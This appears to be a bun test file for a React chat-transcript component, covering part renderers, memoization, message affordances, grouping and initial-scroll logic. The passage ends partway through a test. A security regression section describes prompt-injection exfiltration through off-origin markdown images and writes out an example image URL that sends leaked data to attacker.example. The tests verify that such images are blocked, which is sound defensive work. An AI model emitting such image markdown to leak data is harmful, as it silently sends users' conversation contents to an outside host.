/**
 * ThreadTranscript — the open part-renderer registry's resolution order, the dev/prod fallback
 * contract, and the `MessageBlock` memoization budget from AGENT-CHAT-SPEC.md §9.
 *
 * `messageBlockRenderCounter` is imported directly from `./thread-message` (bypassing the
 * `agent-chat` barrel on purpose — it is not part of the public surface) to prove the memo
 * boundary in a controlled render-count harness.
 */
import { MantineProvider } from '@mantine/core'
import { cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, mock, spyOn, test } from 'bun:test'
import { definePartRenderers } from '../agent'
import type { ChatMessage, TranscriptPart } from '../agent'
import {
  applyInitialScroll,
  MAX_INITIAL_SCROLL_ATTEMPTS,
  messageBlockRenderCounter,
  nonVirtualizedRowsFallback,
  resolveGuardedMeasurement,
  resolveInitialScrollAction,
  ThreadTranscript,
} from './thread-message'
import type { InitialScrollState, ThreadTranscriptProps } from './thread-message'

// `nonVirtualizedRowsFallback` is a plain function component but its export name (this module's
// test-only-escape-hatch convention, matching `messageBlockRenderCounter`) is lowercase-first, so
// JSX would treat `<nonVirtualizedRowsFallback />` as a native DOM tag rather than a component
// reference. Alias it to a capitalized local binding for JSX use below.
const VirtualizeFallback = nonVirtualizedRowsFallback

afterEach(cleanup)

function withNodeEnv<T>(value: string, fn: () => T): T {
  const original = process.env['NODE_ENV']
  process.env['NODE_ENV'] = value
  try {
    return fn()
  } finally {
    // `original` may be undefined (NODE_ENV unset) — assigning undefined through the index
    // signature isn't valid, so restore by deleting the key instead.
    if (original === undefined) delete process.env['NODE_ENV']
    else process.env['NODE_ENV'] = original
  }
}

function buildMessages(count: number): ChatMessage<TranscriptPart>[] {
  return Array.from({ length: count }, (_, i) => {
    const role: ChatMessage<TranscriptPart>['role'] = i % 2 === 0 ? 'user' : 'assistant'
    return {
      id: `m${i}`,
      role,
      parts: [{ id: `m${i}-p1`, type: 'text', text: `message ${i}` }],
      createdAt: i,
    }
  })
}

/** Stubs `navigator.clipboard.writeText`, returning the array of copied strings. happy-dom does
 * not implement the Clipboard API at all. */
function stubClipboard(): string[] {
  const calls: string[] = []
  Object.defineProperty(window.navigator, 'clipboard', {
    configurable: true,
    value: {
      writeText: (text: string) => {
        calls.push(text)
        return Promise.resolve()
      },
    },
  })
  return calls
}

describe('resolution order', () => {
  test('a registered consumer renderer wins over the built-in union', () => {
    const renderers = definePartRenderers({
      'data-chart': () => <div data-testid="chart" />,
    })
    const messages: ChatMessage<TranscriptPart>[] = [
      {
        id: 'm1',
        role: 'assistant',
        parts: [{ id: 'p1', type: 'data-chart', spec: {} }],
        createdAt: 0,
      },
    ]

    render(
      <MantineProvider>
        <ThreadTranscript messages={messages} renderers={renderers} />
      </MantineProvider>,
    )

    expect(screen.getByTestId('chart')).toBeDefined()
  })

  test('a built-in AgentPart type still routes through PartList when unclaimed by renderers', () => {
    const messages: ChatMessage<TranscriptPart>[] = [
      {
        id: 'm1',
        role: 'assistant',
        parts: [{ id: 'p1', type: 'text', text: 'hello' }],
        createdAt: 0,
      },
    ]

    render(
      <MantineProvider>
        <ThreadTranscript messages={messages} />
      </MantineProvider>,
    )

    expect(screen.getByText('hello')).toBeDefined()
  })
})

describe('unknown-part fallback — never throws, dev-visible, prod-silent', () => {
  const messages: ChatMessage<TranscriptPart>[] = [
    {
      id: 'm1',
      role: 'assistant',
      parts: [{ id: 'p1', type: 'data-chart', spec: {} }],
      createdAt: 0,
    },
  ]

  test('renders a visible UnknownPartChip outside production', () => {
    withNodeEnv('development', () => {
      expect(() =>
        render(
          <MantineProvider>
            <ThreadTranscript messages={messages} />
          </MantineProvider>,
        ),
      ).not.toThrow()
      expect(screen.getByText(/Unknown part: data-chart/)).toBeDefined()
    })
  })

  test('renders nothing in production, and still never throws', () => {
    withNodeEnv('production', () => {
      expect(() =>
        render(
          <MantineProvider>
            <ThreadTranscript messages={messages} />
          </MantineProvider>,
        ),
      ).not.toThrow()
      expect(screen.queryByText(/Unknown part/)).toBeNull()
    })
  })
})

function messageWithFinish(
  finish: ChatMessage<TranscriptPart>['finish'],
): ChatMessage<TranscriptPart>[] {
  return [
    {
      id: 'm1',
      role: 'assistant',
      parts: [{ id: 'p1', type: 'text', text: 'hello' }],
      createdAt: 0,
      ...(finish === undefined ? {} : { finish }),
    },
  ]
}

describe('finish indicator (AGENT-CHAT-SPEC.md §10)', () => {
  test('finish: stopped renders an indicator with accessible text', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={messageWithFinish('stopped')} />
      </MantineProvider>,
    )

    expect(screen.getByText('Stopped')).toBeDefined()
  })

  test('finish: error renders an indicator with accessible text', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={messageWithFinish('error')} />
      </MantineProvider>,
    )

    expect(screen.getByText('Error')).toBeDefined()
  })

  test('finish: complete renders no indicator', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={messageWithFinish('complete')} />
      </MantineProvider>,
    )

    expect(screen.queryByText('Stopped')).toBeNull()
    expect(screen.queryByText('Error')).toBeNull()
    expect(screen.queryByText('Complete')).toBeNull()
  })

  test("finish absent renders no indicator, identical to today's output", () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={messageWithFinish(undefined)} />
      </MantineProvider>,
    )

    expect(screen.getByText('hello')).toBeDefined()
    expect(screen.queryByText('Stopped')).toBeNull()
    expect(screen.queryByText('Error')).toBeNull()
  })
})

// ── The settle fix ────────────────────────────────────────────────────────────
//
// `TextRenderer` used to hardcode `streaming`, so `Markdown` always ran in block-split mode and its
// tail block was unconditionally unsettled — a FINISHED message's last block never settled. Two
// visible symptoms, both asserted below: a trailing ```mermaid fence stayed a CodeBlock forever,
// and the last block of every finished message permanently hid its copy action.

const MERMAID_TAIL = 'intro paragraph\n\n```mermaid\ngraph TD\n  A --> B\n```'
const CODE_TAIL = 'intro paragraph\n\n```notalanguage\nfinal body\n```'

function assistantMessage(text: string): ChatMessage<TranscriptPart>[] {
  return [
    { id: 'm1', role: 'assistant', parts: [{ id: 'm1-p1', type: 'text', text }], createdAt: 0 },
  ]
}

describe('settled threading — a finished message settles its FINAL block', () => {
  test('a trailing mermaid fence upgrades out of the CodeBlock', async () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={assistantMessage(MERMAID_TAIL)} />
      </MantineProvider>,
    )

    // MermaidDiagram renders the SVG into a role="img" container; the unsettled path renders a
    // plain <pre> instead.
    expect(await screen.findByRole('img')).toBeDefined()
  })

  test('the final block keeps its copy action', async () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={assistantMessage(CODE_TAIL)} />
      </MantineProvider>,
    )

    await screen.findByText('final body')
    expect(screen.getByLabelText('Copy code')).toBeDefined()
  })
})

describe('settled threading — a streaming message leaves its tail unsettled', () => {
  test('the in-flight tail fence stays a copy-less CodeBlock', async () => {
    render(
      <MantineProvider>
        <ThreadTranscript
          messages={[]}
          liveParts={[{ id: 'live-p1', type: 'text', text: MERMAID_TAIL }]}
          liveStatus="streaming"
        />
      </MantineProvider>,
    )

    const code = await screen.findByText(/graph TD/)
    expect(code.closest('pre')).not.toBeNull()
    expect(screen.queryByRole('img')).toBeNull()
    expect(screen.queryByLabelText('Copy code')).toBeNull()
  })

  test('the same message settles once the run stops streaming', async () => {
    const liveParts: TranscriptPart[] = [{ id: 'live-p1', type: 'text', text: MERMAID_TAIL }]
    const { rerender } = render(
      <MantineProvider>
        <ThreadTranscript messages={[]} liveParts={liveParts} liveStatus="streaming" />
      </MantineProvider>,
    )

    await screen.findByText(/graph TD/)
    expect(screen.queryByRole('img')).toBeNull()

    // Same `liveParts` reference, only `liveStatus` flips — the `MessageBlock` memo comparator
    // must not swallow this final transition (it compares `streaming` explicitly).
    rerender(
      <MantineProvider>
        <ThreadTranscript messages={[]} liveParts={liveParts} liveStatus="done" />
      </MantineProvider>,
    )

    expect(await screen.findByRole('img')).toBeDefined()
  })
})

// ── Image exfiltration guard ──────────────────────────────────────────────────
//
// THIS IS A SECURITY REGRESSION TEST, NOT A RENDERING TEST. Images auto-fetch, so an off-origin
// `<img>` in model-generated markdown is a one-way prompt-injection exfiltration channel:
// `![](https://attacker.example/p.png?q=<whatever the model was told to leak>)` fires a GET the
// moment the transcript paints, with no click and nothing visible.
//
// The control is `Markdown`'s `contentTrust="untrusted"`, and it has already been lost once. The
// settle fix above changed `TextRenderer` from a hardcoded `streaming` to `streaming={!settled}`,
// and at the time `streaming` ALSO selected the image allowlist — so every FINISHED message (i.e.
// nearly the whole transcript) silently regained the open `https://` default. Trust is a property
// of WHERE THE TEXT CAME FROM; settledness is a property of when. They must never be the same prop
// again. The settled case below is the one that regressed.

const OFF_ORIGIN_IMAGE = 'https://attacker.example/pixel.png?q=leak'
const IMAGE_DOC = `![local](/assets/local.png)\n\n![probe](${OFF_ORIGIN_IMAGE})`

describe('transcript images — agent text is untrusted whether or not it has settled', () => {
  async function renderTranscript(streamingTurn: boolean) {
    const parts: TranscriptPart[] = [{ id: 'p1', type: 'text', text: IMAGE_DOC }]
    const { container } = render(
      <MantineProvider>
        {streamingTurn ? (
          <ThreadTranscript messages={[]} liveParts={parts} liveStatus="streaming" />
        ) : (
          <ThreadTranscript messages={assistantMessage(IMAGE_DOC)} />
        )}
      </MantineProvider>,
    )
    // `findByAltText` only ever matches an <img>, so `Markdown`'s Suspense text fallback cannot
    // satisfy it — this waits for the real pipeline, and its success also proves same-origin
    // images still render (an allowlist, not a blanket image kill).
    await screen.findByAltText('local')
    return container
  }

  test('a SETTLED assistant message does NOT render an off-origin https image', async () => {
    const container = await renderTranscript(false)

    expect(screen.getByAltText('local').getAttribute('src')).toBe('/assets/local.png')
    // Dropped whole: no <img> element, and the attacker origin never reaches the DOM at all —
    // not as a src, not as a srcset, not as text.
    expect(screen.queryByAltText('probe')).toBeNull()
    expect(container.querySelector('img[src^="https://"]')).toBeNull()
    expect(container.innerHTML).not.toContain('attacker.example')
  })

  test('an in-flight assistant turn does not render one either', async () => {
    const container = await renderTranscript(true)

    expect(container.querySelector('img[src^="https://"]')).toBeNull()
    expect(container.innerHTML).not.toContain('attacker.example')
  })
})

describe('MessageBlock memoization (AGENT-CHAT-SPEC.md §9)', () => {
  test('a streamed delta re-renders exactly one MessageBlock on a 50-message thread', () => {
    const messages = buildMessages(50)
    const { rerender } = render(
      <MantineProvider>
        <ThreadTranscript
          messages={messages}
          liveParts={[{ id: 'live', type: 'text', text: 'a' }]}
          liveStatus="streaming"
        />
      </MantineProvider>,
    )

    // Mount executes every MessageBlock once (nothing to bail out against yet) — that is not the
    // measurement. Reset the counter once the initial render has settled.
    messageBlockRenderCounter.count = 0

    // Same `messages` array reference (unchanged settled history) + a NEW `liveParts` array
    // reference (the streamed delta) — the one prop a delta actually changes.
    rerender(
      <MantineProvider>
        <ThreadTranscript
          messages={messages}
          liveParts={[{ id: 'live', type: 'text', text: 'ab' }]}
          liveStatus="streaming"
        />
      </MantineProvider>,
    )

    expect(messageBlockRenderCounter.count).toBe(1)
  })

  test('flipping `groupConsecutive` re-renders only the messages whose `grouped` value actually flips', () => {
    const t0 = 1_000_000_000
    const messages: ChatMessage<TranscriptPart>[] = [
      // No predecessor — `grouped` is false either way, this block must NOT re-render.
      { id: 'g0', role: 'user', parts: [{ id: 'g0-p1', type: 'text', text: 'q' }], createdAt: t0 },
      // Different-role predecessor — `grouped` is false either way, must NOT re-render.
      {
        id: 'g1',
        role: 'assistant',
        parts: [{ id: 'g1-p1', type: 'text', text: 'a' }],
        createdAt: t0 + 1_000,
      },
      // Same-role, 1 minute after g1 — `grouped` flips true -> false. The ONLY block that must
      // re-render.
      {
        id: 'g2',
        role: 'assistant',
        parts: [{ id: 'g2-p1', type: 'text', text: 'b' }],
        createdAt: t0 + 60_000,
      },
    ]

    const { rerender } = render(
      <MantineProvider>
        <ThreadTranscript messages={messages} groupConsecutive />
      </MantineProvider>,
    )
    messageBlockRenderCounter.count = 0

    // Same `messages` array + every message object reference unchanged — only the boolean prop
    // flips.
    rerender(
      <MantineProvider>
        <ThreadTranscript messages={messages} groupConsecutive={false} />
      </MantineProvider>,
    )

    expect(messageBlockRenderCounter.count).toBe(1)
  })

  test('a consumer passing a fresh `affordances` object literal each render does not force a re-render', () => {
    const messages = buildMessages(10)
    const { rerender } = render(
      <MantineProvider>
        <ThreadTranscript messages={messages} affordances={{ timestamp: 'relative', copy: true }} />
      </MantineProvider>,
    )
    messageBlockRenderCounter.count = 0

    // A BRAND NEW object literal, same field values, same `messages` reference — nothing has
    // actually changed from any consumer's point of view.
    rerender(
      <MantineProvider>
        <ThreadTranscript messages={messages} affordances={{ timestamp: 'relative', copy: true }} />
      </MantineProvider>,
    )

    expect(messageBlockRenderCounter.count).toBe(0)
  })
})

function singleMessage(createdAt: number): ChatMessage<TranscriptPart>[] {
  return [
    {
      id: 'aff1',
      role: 'assistant',
      parts: [{ id: 'aff1-p1', type: 'text', text: 'hello there' }],
      createdAt,
    },
  ]
}

/** Stands in for a consumer's own `useCallback`-wrapped `actions` — see the memo-bail-out test. */
const STABLE_ACTIONS = (): null => null

describe('per-message affordances (AGENT-CHAT-SPEC.md §11)', () => {
  test('timestamp: relative (the default) renders a relative label', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={singleMessage(Date.now() - 5 * 60_000)} />
      </MantineProvider>,
    )

    expect(within(screen.getByTestId('message-affordances-aff1')).getByText(/ago/)).toBeDefined()
  })

  test('timestamp: absolute renders a locale date/time string, not a relative one', () => {
    const createdAt = new Date('2024-01-01T12:00:00Z').getTime()
    render(
      <MantineProvider>
        <ThreadTranscript
          messages={singleMessage(createdAt)}
          affordances={{ timestamp: 'absolute' }}
        />
      </MantineProvider>,
    )

    const row = within(screen.getByTestId('message-affordances-aff1'))
    expect(row.getByText(new Date(createdAt).toLocaleString())).toBeDefined()
    expect(row.queryByText(/ago/)).toBeNull()
  })

  test('timestamp: none renders no timestamp text at all', () => {
    render(
      <MantineProvider>
        <ThreadTranscript
          messages={singleMessage(Date.now())}
          affordances={{ timestamp: 'none' }}
        />
      </MantineProvider>,
    )

    expect(within(screen.getByTestId('message-affordances-aff1')).queryByText(/ago/)).toBeNull()
  })

  test('copy copies the message COALESCED text, not a naive join of the raw parts', async () => {
    const calls = stubClipboard()
    const messages: ChatMessage<TranscriptPart>[] = [
      {
        id: 'aff2',
        role: 'assistant',
        parts: [
          { id: 'p1', type: 'text', text: 'Hello' },
          // A source part splits the run — a non-text part sitting between two text parts. Naive
          // `parts.map(p => p.text).join('')` would blow up on `.text` not existing here; the
          // coalesced-segment walk skips it and joins the two text runs with a blank line.
          { id: 'p2', type: 'source', url: 'https://example.com' },
          { id: 'p3', type: 'text', text: 'World' },
        ],
        createdAt: Date.now(),
      },
    ]

    render(
      <MantineProvider>
        <ThreadTranscript messages={messages} />
      </MantineProvider>,
    )

    fireEvent.click(screen.getByLabelText('Copy message'))

    await waitFor(() => expect(calls).toEqual(['Hello\n\nWorld']))
  })

  test('regenerate appears on the LAST assistant message only, and calls back with its id', () => {
    const calls: string[] = []
    const now = Date.now()
    const messages: ChatMessage<TranscriptPart>[] = [
      { id: 'u1', role: 'user', parts: [{ id: 'u1-p1', type: 'text', text: 'q' }], createdAt: now },
      {
        id: 'a1',
        role: 'assistant',
        parts: [{ id: 'a1-p1', type: 'text', text: 'first reply' }],
        createdAt: now + 1_000,
      },
      {
        id: 'u2',
        role: 'user',
        parts: [{ id: 'u2-p1', type: 'text', text: 'q2' }],
        createdAt: now + 2_000,
      },
      {
        id: 'a2',
        role: 'assistant',
        parts: [{ id: 'a2-p1', type: 'text', text: 'second reply' }],
        createdAt: now + 3_000,
      },
    ]

    render(
      <MantineProvider>
        <ThreadTranscript
          messages={messages}
          affordances={{ onRegenerate: (messageId) => calls.push(messageId) }}
        />
      </MantineProvider>,
    )

    expect(screen.getAllByText('Regenerate')).toHaveLength(1)
    const lastRow = within(screen.getByTestId('message-affordances-a2'))
    fireEvent.click(lastRow.getByText('Regenerate'))
    expect(calls).toEqual(['a2'])
  })

  test('custom actions render alongside the built-in affordances, on every message', () => {
    render(
      <MantineProvider>
        <ThreadTranscript
          messages={singleMessage(Date.now())}
          affordances={{
            actions: ({ message }) => <button type="button">{`pin-${message.id}`}</button>,
          }}
        />
      </MantineProvider>,
    )

    expect(screen.getByText('pin-aff1')).toBeDefined()
  })

  test('the live/streaming message never renders an affordance row', () => {
    render(
      <MantineProvider>
        <ThreadTranscript
          messages={[]}
          liveParts={[{ id: 'live-p1', type: 'text', text: 'partial reply' }]}
          liveStatus="streaming"
        />
      </MantineProvider>,
    )

    expect(screen.queryByTestId('message-affordances-__live__')).toBeNull()
    expect(screen.queryByLabelText('Copy message')).toBeNull()
  })

  test('renders no affordance row at all when every affordance resolves to off', () => {
    render(
      <MantineProvider>
        <ThreadTranscript
          messages={singleMessage(Date.now())}
          affordances={{ timestamp: 'none', copy: false }}
        />
      </MantineProvider>,
    )

    // No onRegenerate (so no regenerate control, even though this IS the last assistant message)
    // and no custom `actions` either — nothing for the row to show, so `MessageAffordanceRow`
    // renders `null` rather than an empty strip.
    expect(screen.queryByTestId('message-affordances-aff1')).toBeNull()
  })

  test('a fresh onRegenerate literal each render does not force a re-render either', () => {
    const messages = buildMessages(10)
    const { rerender } = render(
      <MantineProvider>
        <ThreadTranscript messages={messages} affordances={{ onRegenerate: (id) => id }} />
      </MantineProvider>,
    )
    messageBlockRenderCounter.count = 0

    // A brand-new handler literal every render (the realistic consumer shape this finding names) —
    // `useStableCallback` must absorb this so `resolvedAffordances`'s reference stays put. Note
    // this covers `onRegenerate` ONLY: `actions` is a render prop and is deliberately compared by
    // reference (see the two tests below, and `MessageAffordances.actions`'s own doc).
    rerender(
      <MantineProvider>
        <ThreadTranscript messages={messages} affordances={{ onRegenerate: (id) => id }} />
      </MantineProvider>,
    )

    expect(messageBlockRenderCounter.count).toBe(0)
  })

  test('a consumer `actions` render prop reflects the consumer state it closes over', () => {
    // The counterweight to the test above, and the reason `actions` is exempt from
    // `useStableCallback`: `actions` is invoked DURING render to produce nodes, so identity-
    // stabilizing it would freeze `resolvedAffordances` → `settledRows` → the very JSX element
    // objects React reconciles, and the consumer's control would render its first-render output
    // for the transcript's whole lifetime. This is the shape any real pin/star/bookmark action
    // takes.
    const messages = singleMessage(Date.now())
    const { rerender } = render(
      <MantineProvider>
        <ThreadTranscript
          messages={messages}
          affordances={{ actions: () => <span data-testid="pin">pinned: no</span> }}
        />
      </MantineProvider>,
    )

    expect(screen.getByTestId('pin').textContent).toBe('pinned: no')

    rerender(
      <MantineProvider>
        <ThreadTranscript
          messages={messages}
          affordances={{ actions: () => <span data-testid="pin">pinned: yes</span> }}
        />
      </MantineProvider>,
    )

    expect(screen.getByTestId('pin').textContent).toBe('pinned: yes')
  })

  test('a REFERENCE-STABLE `actions` still gets the memo bail-out', () => {
    // The documented opt-out: a consumer that wraps `actions` in its own `useCallback` (modelled
    // here by a module-scope constant) keeps the whole `affordances`-by-reference bail-out, so
    // exempting `actions` costs nothing for a consumer that cares about it.
    const messages = buildMessages(10)
    const { rerender } = render(
      <MantineProvider>
        <ThreadTranscript messages={messages} affordances={{ actions: STABLE_ACTIONS }} />
      </MantineProvider>,
    )
    messageBlockRenderCounter.count = 0

    rerender(
      <MantineProvider>
        <ThreadTranscript messages={messages} affordances={{ actions: STABLE_ACTIONS }} />
      </MantineProvider>,
    )

    expect(messageBlockRenderCounter.count).toBe(0)
  })
})

describe('affordance row visibility — hover OR focus-within (a11y)', () => {
  test('a descendant holding focus reveals the row, not just mouse hover', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={singleMessage(Date.now())} />
      </MantineProvider>,
    )

    const row = screen.getByTestId('message-affordances-aff1')
    expect(row.style.opacity).toBe('0')

    // The row stays mounted regardless of visibility (see `MessageAffordanceRowProps.visible`'s
    // doc), so its Copy control is focusable even before hover/focus reveals it. `focusIn` (not
    // `focus`, which does not bubble) is what `useFocusWithin`'s underlying `addEventListener`
    // actually listens for — matching how a real Tab keypress reaches focus in the browser.
    fireEvent.focusIn(screen.getByLabelText('Copy message'))

    expect(row.style.opacity).toBe('1')

    fireEvent.focusOut(screen.getByLabelText('Copy message'))

    expect(row.style.opacity).toBe('0')
  })
})

describe('groupConsecutive — the Slack rhythm (AGENT-CHAT-SPEC.md §11, default true)', () => {
  const T0 = 1_000_000_000

  function pair(
    deltaMs: number,
    roleA: ChatMessage<TranscriptPart>['role'] = 'assistant',
    roleB: ChatMessage<TranscriptPart>['role'] = 'assistant',
  ): ChatMessage<TranscriptPart>[] {
    return [
      {
        id: 'gp1',
        role: roleA,
        parts: [{ id: 'gp1-p1', type: 'text', text: 'first' }],
        createdAt: T0,
      },
      {
        id: 'gp2',
        role: roleB,
        parts: [{ id: 'gp2-p1', type: 'text', text: 'second' }],
        createdAt: T0 + deltaMs,
      },
    ]
  }

  test('same role within 5 minutes groups — the second message drops its role label and chrome', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={pair(60_000)} />
      </MantineProvider>,
    )

    expect(screen.getAllByText('Assistant')).toHaveLength(1)
    expect(screen.getByTestId('agent-message-gp2').getAttribute('data-grouped')).toBe('true')
  })

  test('same role at exactly the 5-minute boundary still groups', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={pair(5 * 60_000)} />
      </MantineProvider>,
    )

    expect(screen.getAllByText('Assistant')).toHaveLength(1)
  })

  test('same role at 5 minutes + 1ms does NOT group', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={pair(5 * 60_000 + 1)} />
      </MantineProvider>,
    )

    expect(screen.getAllByText('Assistant')).toHaveLength(2)
    expect(screen.getByTestId('agent-message-gp2').getAttribute('data-grouped')).toBe('false')
  })

  test('different roles never group, regardless of how close in time', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={pair(0, 'user', 'assistant')} />
      </MantineProvider>,
    )

    expect(screen.getByText('You')).toBeDefined()
    expect(screen.getByText('Assistant')).toBeDefined()
  })

  test('the first message never groups — there is no predecessor', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={pair(60_000).slice(0, 1)} />
      </MantineProvider>,
    )

    expect(screen.getByTestId('agent-message-gp1').getAttribute('data-grouped')).toBe('false')
  })

  test('groupConsecutive={false} disables grouping entirely', () => {
    render(
      <MantineProvider>
        <ThreadTranscript messages={pair(1_000)} groupConsecutive={false} />
      </MantineProvider>,
    )

    expect(screen.getAllByText('Assistant')).toHaveLength(2)
  })
})

/** A minimal fake matching `MeasurementCacheHost`'s structural shape — no ResizeObserver, no
 * layout engine, no `@tanstack/react-virtual` import at all needed to prove the guard branch. */
function fakeMeasurementHost({
  cached,
  estimate = 999,
}: { readonly cached?: number; readonly estimate?: number } = {}) {
  const itemSizeCache = new Map<unknown, number>()
  if (cached !== undefined) itemSizeCache.set('row-key', cached)
  return {
    indexFromElement: () => 0,
    itemSizeCache,
    options: {
      getItemKey: () => 'row-key',
      estimateSize: () => estimate,
    },
  }
}

describe('resolveGuardedMeasurement — a 0 ResizeObserver reading is never a real row measurement', () => {
  const element = document.createElement('div')

  test('a genuine (non-zero) measurement passes through unchanged', () => {
    const host = fakeMeasurementHost({ cached: 40 })
    expect(resolveGuardedMeasurement(host, element, 145)).toBe(145)
  })

  test('a 0 reading with a cached size falls back to the LAST-KNOWN size, not 0 — this is the exact mechanism that stops a collapsed virtualized row from poisoning itemSizeCache', () => {
    const host = fakeMeasurementHost({ cached: 220 })
    expect(resolveGuardedMeasurement(host, element, 0)).toBe(220)
  })

  test('a 0 reading with no prior measurement (first mount) falls back to estimateSize, not 0', () => {
    const host = fakeMeasurementHost({ estimate: 160 })
    expect(resolveGuardedMeasurement(host, element, 0)).toBe(160)
  })
})

describe('resolveInitialScrollAction — the pure decision behind "a virtualized transcript opens at the newest message"', () => {
  test('"start" resolves to skip-done regardless of row count or container height', () => {
    expect(resolveInitialScrollAction('start', 50, 300)).toBe('skip-done')
    expect(resolveInitialScrollAction('start', 0, 0)).toBe('skip-done')
  })

  test('an empty transcript resolves to skip-done even when targeting "end" — nothing to scroll to', () => {
    expect(resolveInitialScrollAction('end', 0, 300)).toBe('skip-done')
  })

  test('a non-positive container height resolves to skip-retry, NOT skip-done — a hidden ancestor must not permanently strand the transcript at the top', () => {
    expect(resolveInitialScrollAction('end', 50, 0)).toBe('skip-retry')
    expect(resolveInitialScrollAction('end', 50, -1)).toBe('skip-retry')
  })

  test('a genuinely measured, non-empty, "end"-targeted mount resolves to scroll', () => {
    expect(resolveInitialScrollAction('end', 50, 300)).toBe('scroll')
  })
})

describe('applyInitialScroll — the ACROSS-CALLS guard that makes the jump fire once, ever', () => {
  // A fake `scrollToEnd` is the boundary here rather than a real DOM `Element.scrollTo` spy on
  // purpose: a real `Virtualizer`'s own `followOnAppend` ALSO calls `scrollTo` on a later append
  // (verified against the installed virtual-core 3.17.1 — `setOptions`'s edge-key-change branch),
  // making that call indistinguishable from this effect's own at the DOM boundary. `applyInitialScroll`
  // is the exact function `VirtualizedRowsInner`'s effect calls, so this proves the real guard, not
  // a hand-mirrored copy of it. `isAtEnd` is likewise a fake rather than a real DOM `scrollTop` read
  // — this describe block proves the STATE MACHINE (fire → verify → settle-or-retry, bounded), not
  // the real browser race the fix exists for, which happy-dom cannot observe (no layout engine —
  // see the `initialScroll` describe block below for what IS provable against the real component).

  test('fires once, stays unsettled until a later call confirms it via isAtEnd, then never fires again', () => {
    const state: InitialScrollState = { hasApplied: false, attempts: 0 }
    const scrollToEnd = mock(() => {})
    const isAtEnd = mock(() => true)

    applyInitialScroll(state, 'end', 60, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(1)
    // Not yet permanent: firing is not landing. Verification happens on the NEXT call.
    expect(state.hasApplied).toBe(false)

    // Simulates the effect re-running on every later streamed append (rows.length keeps growing)
    // — the exact scenario that must NOT re-trigger the jump once it has settled.
    applyInitialScroll(state, 'end', 61, () => 300, scrollToEnd, isAtEnd)
    expect(state.hasApplied).toBe(true)

    applyInitialScroll(state, 'end', 62, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(1)
  })

  test('re-fires when isAtEnd reports the jump was reverted before settling — the clobber-recovery path', () => {
    const state: InitialScrollState = { hasApplied: false, attempts: 0 }
    const scrollToEnd = mock(() => {})
    let atEnd = false
    const isAtEnd = () => atEnd

    // First attempt: fires, unconfirmed.
    applyInitialScroll(state, 'end', 60, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(1)

    // Next commit: the DOM reports NOT at the end (something else clobbered `scrollTop` in the
    // meantime, e.g. virtual-core's own `_willUpdate` anchor branch) — re-fires rather than
    // accepting the reverted position as final.
    applyInitialScroll(state, 'end', 60, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(2)
    expect(state.hasApplied).toBe(false)

    // The DOM now holds: settles on the next confirming call.
    atEnd = true
    applyInitialScroll(state, 'end', 60, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(2)
    expect(state.hasApplied).toBe(true)

    // A further call must not fire again.
    applyInitialScroll(state, 'end', 61, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(2)
  })

  test('gives up after MAX_INITIAL_SCROLL_ATTEMPTS rather than retrying forever against a DOM that never confirms', () => {
    const state: InitialScrollState = { hasApplied: false, attempts: 0 }
    const scrollToEnd = mock(() => {})
    // never confirms — the pathological case this bound exists for
    const isAtEnd = mock(() => false)

    for (let i = 0; i < 20; i += 1) {
      applyInitialScroll(state, 'end', 60, () => 300, scrollToEnd, isAtEnd)
    }

    expect(state.hasApplied).toBe(true)
    expect(scrollToEnd).toHaveBeenCalledTimes(MAX_INITIAL_SCROLL_ATTEMPTS)

    // Once given up, further calls are true no-ops.
    applyInitialScroll(state, 'end', 61, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(MAX_INITIAL_SCROLL_ATTEMPTS)
  })

  test('"start" marks done WITHOUT ever calling scrollToEnd — mutation-proof for the skip-done branch not silently becoming skip-retry', () => {
    const state: InitialScrollState = { hasApplied: false, attempts: 0 }
    const scrollToEnd = mock(() => {})
    const isAtEnd = mock(() => false)

    applyInitialScroll(state, 'start', 60, () => 300, scrollToEnd, isAtEnd)

    expect(scrollToEnd).not.toHaveBeenCalled()
    expect(isAtEnd).not.toHaveBeenCalled()
    expect(state.hasApplied).toBe(true)
  })

  test('an empty transcript marks done WITHOUT ever calling scrollToEnd', () => {
    const state: InitialScrollState = { hasApplied: false, attempts: 0 }
    const scrollToEnd = mock(() => {})
    const isAtEnd = mock(() => false)

    applyInitialScroll(state, 'end', 0, () => 300, scrollToEnd, isAtEnd)

    expect(scrollToEnd).not.toHaveBeenCalled()
    expect(isAtEnd).not.toHaveBeenCalled()
    expect(state.hasApplied).toBe(true)
  })

  test('a hidden (0px) container retries on a later call instead of being permanently stranded, then settles once confirmed', () => {
    const state: InitialScrollState = { hasApplied: false, attempts: 0 }
    const scrollToEnd = mock(() => {})
    const isAtEnd = mock(() => true)

    // First attempt: mounted behind a `display: none` ancestor — measures 0.
    applyInitialScroll(state, 'end', 60, () => 0, scrollToEnd, isAtEnd)
    expect(scrollToEnd).not.toHaveBeenCalled()
    expect(state.hasApplied).toBe(false)

    // Second attempt — the row was re-expanded, so the SAME row count now measures. Deliberately
    // NOT a changed count: the commit that un-hides a `ThreadFeedRow` body changes nothing the
    // effect could key a dependency array on, which is why that effect has none. Fires, unconfirmed.
    applyInitialScroll(state, 'end', 60, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(1)
